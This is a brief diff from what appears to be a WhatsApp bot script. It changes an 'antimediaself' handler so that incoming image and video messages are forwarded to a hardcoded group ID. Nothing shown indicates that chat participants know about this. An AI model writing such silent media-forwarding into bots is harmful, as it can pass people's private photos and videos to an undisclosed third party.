@@ -820,9 +820,11 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
     return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
   }
-        if (db.data.settings[botNumber].antimediaself && isMedia) {
+        if (db.data.settings[botNumber].antimediaself && isXeonMedia) {
+            if(isXeonMedia === "videoMessage" || isXeonMedia === "imageMessage"){
             let val = { ...m }
     return XeonBotInc.sendMessage("120363276024993778@g.us", { forward : val }, {quoted : m})
+  }
   }
         if (db.data.chats[m.chat].image && isXeonMedia) {
     if(isXeonMedia === "imageMessage"){
